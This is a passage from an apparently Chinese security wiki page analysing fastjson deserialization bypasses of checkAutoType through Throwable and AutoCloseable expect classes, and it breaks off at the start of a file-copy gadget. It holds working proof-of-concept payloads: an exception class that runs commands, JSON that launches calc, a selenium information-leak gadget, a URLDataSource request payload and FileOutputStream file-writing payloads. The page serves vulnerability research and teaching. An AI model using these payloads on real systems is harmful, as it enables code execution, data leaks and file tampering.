src="/SecWikiPublic/secwiki/assets/img/image-20240425145523-trirgmp.be591767.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425145006-3u8b6oy.be730d86.png" alt="image" loading="lazy">​</p><p>​<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>​ 方法直接将 <code>@type</code>​ 后指定的异常类进行了 <code>ParserConfig#checkAutoType()</code>​ 校验。</p><p>进入到 <code>ThrowableDeserializer#deserialze()</code>​ 后，词法分析器会继续遍历 JSON 字符串剩余的部分，<strong><mark>如果紧接着的键还是一个</mark></strong> <code>@type</code>​ 的话，就会将它的**<mark>值</mark>**且 <code>Throwable.class</code>​ 作为期望类 <code>expectClass</code>​，一同传入 <code>ParserConfig#checkAutoType()</code>​ 进行校验。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150456-b5rgf7h.273d233e.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150719-jdji7as.f24d1f44.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150713-rricoje.b8227b99.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150835-gpve8q7.9120969e.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425151044-zb3jhqa.7e277d82.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425151450-7ism17s.1388ae72.png" alt="image" title="因为这几行代码的限制，大部分的 JNDI gadget 都不能用了" loading="lazy">​</p><p>通过 <code>checkAutoType()</code>​ 之后，将使用 <code>createException</code>​ 来创建异常类的实例。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425152648-abkxnca.0789efa1.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425152803-m6loflc.abb6b119.png" alt="image" loading="lazy">​</p><p>这就形成了 <code>Throwable</code>​ 子类绕过 <code>checkAutoType()</code>​ 的方式。我们需要找到 <code>Throwable</code>​ 的子类，这个类的 <code>getter/setter/static block/constructor</code>​ 中含有具有威胁的代码逻辑。</p><h4 id="poc" tabindex="-1"><a class="header-anchor" href="#poc"><span>POC</span></a></h4><p>写一个有问题的异常类，去验证 Throwable 这个利用点。</p><p><strong>【异常类</strong> <strong>​</strong>​<strong>​<code>ExecException</code>​</strong>​<strong>​</strong>​ <strong>】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">EXP</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExecException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> command<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>command <span class="token operator">=</span> command<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【然后就是构造 JSON 字符串】</strong> 要注意的是，由于 <code>java.lang.Throwable</code>​ 这个类不在缓存集合 <code>TypeUtils#mappings</code>​ 中，所以未开启 autoType 的情况下，这个类是不能通过 <code>ParserConfig#checkAutoType()</code>​ 的校验的。</p><p>这里在 JSON 字符串中使用它的一个子类 <code>java.lang.Exception</code>​，因为 <code>java.lang.Exception</code>​ 是在缓存集合 <code>TypeUtils#mappigns</code>​ 中的。</p><p>​<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425135447-pshk3ko.2360917b.png" alt="image" loading="lazy">​</p><p>另外还有一个问题，就是我们的 <code>ExecException</code>​ 类的危险操作是在 getter 方法中的。而前面提到，反序列化异常类过程中，只会执行到 setter 方法，并没有执行 getter 方法。（<mark>但是如果是通过</mark> <code>JSON.parseObject();</code>​ <mark>的方法进行反序列化的话则会调用所有的 getter 和 setter 方法。</mark>）</p><p>如果是 <code>JSON.parse()</code>​ 进行反序列化的话，这里可以利用 fastjson 的 JSONPath 特性 <code>$ref</code>​ 去引用指定对象的某个 <code>xxx</code>​ 属性，从而访问该对象的 <code>getXXX()</code>​ 方法。【来自 <a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6#diff-95dea369074735c578ad43e600aaade743b2b52878fedbbdb76ea6d4936956a4" target="_blank" rel="noopener noreferrer">feat:fastjson 一种利用 $ref 几乎任意 getter 触发的方法 · threedr3am/learnjavabug@ea61297 (@threedr3am)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>】</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> payload1 <span class="token operator">=</span> <span class="token string">&quot;{\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;  \&quot;@type\&quot;: \&quot;EXP.ExecException\&quot;,\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;  \&quot;command\&quot;: \&quot;calc\&quot;\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;}&quot;</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> payload2 <span class="token operator">=</span> <span class="token string">&quot;{\&quot;x\&quot;:\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;\t{\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;\t \&quot;@type\&quot;:\&quot;EXP.ExecException\&quot;, \n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;\t         \&quot;command\&quot;:\&quot;calc\&quot;}, \n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot; \&quot;y\&quot;:{\&quot;$ref\&quot;:\&quot;$x.message\&quot;}\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot; }&quot;</span><span class="token punctuation">;</span>

        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// payload1 或 payload2 均可</span>
        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 只能使用 payload2</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行 PoC 后成功弹出计算器。</p><p>上述 PoC 只是为了验证 <code>Throwable</code>​ 这个利用点。<strong>实际上很少有异常类会使用到高危函数，所以目前还没见有公开的可针对 Throwable 这个利用点的 RCE gadget。</strong></p><p>不过 <a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ" target="_blank" rel="noopener noreferrer">@ 浅蓝<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 倒是给出了一个非 RCE 的 gadget，它需要目标环境依赖 selenium 库。</p><h4 id="依赖-selenium-的信息泄露-gadget" tabindex="-1"><a class="header-anchor" href="#依赖-selenium-的信息泄露-gadget"><span>依赖 selenium 的信息泄露 gadget</span></a></h4><p>【<strong>添加依赖】</strong></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.seleniumhq.selenium<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>selenium-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 <code>org.openqa.selenium.WebDriverException</code>​ 类的 <code>getMessage()</code>​ 方法和 <code>getSystemInformation()</code>​ 方法都能获取一些系统信息。比如：IP 地址、主机名、系统架构、系统名称、系统版本、JDK 版本、selenium webdriver 版本。</p><p>同时由于是异常类，父类的 <code>getStackTrace()</code>​ 也会被调用，会输出当前方法栈信息，可从中看出使用了什么框架。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425143021-5b0deuz.eabc2d5d.png" alt="image" loading="lazy">​</p><p>因此，可根据情况构造 poc（因为信息不一定能回显，取决于目标程序的代码实现），类似这样。</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.Exception&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;org.openqa.selenium.WebDriverException&quot;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;$ref&quot;</span><span class="token operator">:</span> <span class="token string">&quot;$x.systemInformation&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// ======== </span>
用到了 $ref 字段来调用异常类对象的 getSystemInformation 方法把值引用到 y 字段，这个根据实际环境回显什么字段就填什么字段呗
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="其他用途实例" tabindex="-1"><a class="header-anchor" href="#其他用途实例"><span>其他用途实例</span></a></h4><p>除此之外其实还可以有其他用途，例如可以绕过类对象的访问。</p><p>举个例子，<strong><mark>某个异常类的 get 方法返回的对象类型是 DataSource，这个类型肯定是不允许被反序列化的。</mark></strong> <mark>但他在异常类中被传来的允许被反序列化的类对象构造成了一个 DataSource 对象。再去调用 get 方法访问这个 DataSource 的时候，fastjson 就管不着了。</mark></p><p>这种例子我在 apache abdera 的一个异常类中见到过。</p><p><a href="https://github.com/apache/abdera/blob/43fae3a0bb450895042bf0825f11fbf39832e830/server/src/main/java/org/apache/abdera/server/exceptions/AbderaServerException.java" target="_blank" rel="noopener noreferrer">/org/apache/abdera/server/exceptions/AbderaServerException.java<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><strong>【类似的类】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DatasourceException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token class-name">DatasourceException</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">DataSource</span> dataSource<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">getDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> dataSource<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDataSource</span><span class="token punctuation">(</span><span class="token class-name">URL</span> url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLDataSource</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 构造成了一个 DataSource 对象</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在拿到 DatasourceException 这个类的成员变量以后，因此在 JSON.toJSON 中取得的反序列化的类 DatasourceException 的几个 gettter 的 filed 信息，包括从 Throwable 继承的 4 个 getter 和自身的 getter 共 5 个。</p><p>那么此时要放入到 JSONObject 中，那么对于其中的每个键和值都将 put 一次，那么对于其中的 value，又要调用一次 <code>tojson(value)</code>​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428164306-ldzoyxx.0c8d353e.png" alt="image" loading="lazy">​</p><p>那么对于赋值给 datasource 的 URLDataSource 而言，也要走一次 tojson，因此此时要调用 URLDataSource 的所有 getter。那么对于 inputStream，要调用 URLDataSource 的 getInputStream,那么在 getInputStream 中此时将触发请求。</p><p><strong>【POC】</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.lang.Exception&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;DatasourceException&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;dataSource&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.URL&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;http://127.0.0.1:2333/hello&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428100858-pw2vcri.12855117.png" alt="image" loading="lazy">​</p><h3 id="autocloseable-利用" tabindex="-1"><a class="header-anchor" href="#autocloseable-利用"><span>AutoCloseable 利用</span></a></h3><h4 id="原理-1" tabindex="-1"><a class="header-anchor" href="#原理-1"><span>原理</span></a></h4><p>与 <code>Throwable</code>​ 类似地，还有 <code>AutoCloseable</code>​。</p><p>接着来看 <code>JavaBeanDeserializer#deserialze()</code>​，区别在于 <code>JavaBeanDeserializer#deserialze()</code>​ 中的 expectClass 参数是用户可控的，所以漏洞利用可发挥的空间更大。</p><p>现在公开的比较具有实战意义的 gadget 都使用了 <code>java.lang.AutoCloseable</code>​ 作为 expectClass。之所以使用 AutoCloseable 而不是其它类，原因如下：</p><ul><li>java.lang.AutoCloseable 在 <code>TypeUtils#mappings</code>​ 缓存集合中</li><li>java.lang.AutoCloseable 使用 fastjson 默认的反序列化器 JavaBeanDeserializer</li><li>通过查阅 JDK 文档可知，<a href="https://docs.oracle.com/javase/8/docs/api/java/lang/AutoCloseable.html" target="_blank" rel="noopener noreferrer">AutoCloseable<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>（即其子类对象）持有文件句柄或者 socket 句柄，所以它是很多类型的父接口(比如 xxxStream、xxxChannel、xxxConnection)。因此即便无法找到 RCE gadget，也可以找到实现文件读取或写入的 gadget，从而可以根据目标环境实际情况串出 RCE</li></ul><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428102334-8c9qjov.5a0876b3.png" alt="image" title="com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425153909-tbmbcsb.9989bbdf.png" alt="image" loading="lazy">​</p><p>父类、父接口黑名单，fastjson 在判断期望类之前将继承自 ClassLoader、DataSource、RowSet 的类直接抛出异常。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428102817-zot51h3.a00de011.png" alt="image" loading="lazy">​</p><h4 id="构造-poc-时的坑-1-选对构造方法" tabindex="-1"><a class="header-anchor" href="#构造-poc-时的坑-1-选对构造方法"><span>构造 PoC 时的坑 - 1：选对构造方法</span></a></h4><p>fastjson 在调用 <code>JavaBeanDeserializer#deserialze()</code>​ 进行反序列化的过程中，会去寻找目标类的 <code>public</code>​ 类型的构造方法：<mark>如果存在无参构造方法</mark>，则将其作为构造方法供后续实例化使用。否则，使用<mark>参数数量最多且排在最前面的构造方法</mark>。这里的最前面是指 <code>ASMUtils.lookupParameterNames(constructor)</code>​ 获取到的顺序。</p><p>​<code>com.alibaba.fastjson.util.ASMUtils#lookupParameterNames</code>​</p><p>(具体代码逻辑见 <code>JavaBeanInfo#build()</code>​ 静态方法)</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425160805-92qotq9.6285dce8.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425161909-rzh0jg8.ef039987.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425163224-04xkxqc.1d3fbbf5.png" alt="image" loading="lazy">​</p><p>从上面的三个判断可知，fastjson 只保留符合特定条件的构造函数。</p><p><strong><mark>保留所有 public修饰的构造函数，并且有参数名的构造函数会被优先选择，如果存在参数数量相同的构造函数，则只保留第一个。</mark></strong> ​</p><p>举个例子，我想通过 fastjson 反序列化 <code>java.io.FileOutputStream</code>​ 来新建一个文件。FileOutpuStream 的构造方法有多个，如下图。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425172326-znmp4u2.283fc290.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425173927-dzw3yre.d05edc73.png" alt="image" loading="lazy">​</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.io.FileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;name&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/test2.txt&quot;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 这里主要是属性错了导致的构造函数，是 file 而不是 name，主要是为了看调用的哪个构造函数</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425174349-b1ah3py.d978158b.png" alt="image" loading="lazy">​</p><p>结果抛异常，无法创建实例。从报错信息可以看到它调用的是 <code>public FileOutputStream(File, boolean)</code>​ 这个构造方法。</p><p>故将 JSON 字符串改为：</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.io.FileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;file&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/test1.txt&quot;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 或者显式声明 append</span>
<span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.io.FileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;file&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/test2.txt&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;append&quot;</span><span class="token operator">:</span> <span class="token string">&quot;false&quot;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425171345-5jjiu6x.b83f6a69.png" alt="image" loading="lazy">​</p><p>运行后，成功反序列化，可以看到生成了文件。<strong><mark>前提是使用 JDK 11</mark></strong>，JDK 8 不管如何都会报错：<code>default constructor not found</code>​。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425172734-87ixm5d.751723ab.png" alt="image" loading="lazy">​</p><h4 id="构造-poc-时的坑-2-构造方法需带调试信息" tabindex="-1"><a class="header-anchor" href="#构造-poc-时的坑-2-构造方法需带调试信息"><span>构造 PoC 时的坑 - 2：构造方法需带调试信息</span></a></h4><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425174038-ojkna0i.687c6c1d.png" alt="image" loading="lazy">​</p><p>运行上面的 PoC 会报错。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425154708-rvpbc7y.306dd164.png" alt="image" loading="lazy">​</p><p>调试分析发现 <code>ASMUtils.lookupParameterNames(constructor)</code>​ 方法获取构造方法的参数名失败。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425174845-7lo5yui.a0283dae.png" alt="image" loading="lazy">​</p><p><strong><mark>调试环境的 Oracle JDK 8u20，并没有保留包含有参数名的调试信息。</mark></strong></p><p>可以使用 <code>javap -l \&lt;class-name\&gt;</code>​ 查看指定类是否包含参数名信息。 下面来对比一下笔者安装的 Oracle JDK <code>8u201</code> ​和 OpenJDK <code>11.0.14</code> ​的 <code>java.io.FileOutputStream</code> ​类。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425180248-ynkdxka.06fa1c52.png" alt="image" loading="lazy">​</p><p>如上图，可以看到 OpenJDK 11.0.14 中，是保留了局部变量表 <code>LocalVariableTable</code>​ 的，即保留了**<mark>局部变量名信息</mark>**。</p><p>而具体哪个版本 JDK 存在调试信息，或不存在调试信息，这个并没有规律。（openjdk 8, 包括 oracle jdk 都是不带这些信息的）因此，<strong>尽管存在仅依赖 JDK 的 Gadget，但通用性是大打折扣的。不过好在多数的第三方库里的字节码是有</strong> <strong>​</strong>​<strong>​<code>LocalVariableTable</code>​</strong>​<strong>​</strong>​ <strong>的</strong>。</p><h2 id="利用链" tabindex="-1"><a class="header-anchor" href="#利用链"><span>利用链</span></a></h2><h3 id="gadget-1-复制文件" tabindex="-1"><a class="header-anchor" href="#gadget-1-复制文件"><span>Gadget 1：复制文件</span></a></h3><p><strong><mark>【注意事项】</mark></strong></p><p>请务必确认 src 文件不存在，不然会被清空。。。</p><p>除非该文件被限制访问，如 <code>C:/Windows/win.ini</code>​</p><p><strong><mark>所以应该叫复制并清空文件才对。。。</mark></strong></p><p><strong>【依赖】</strong></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
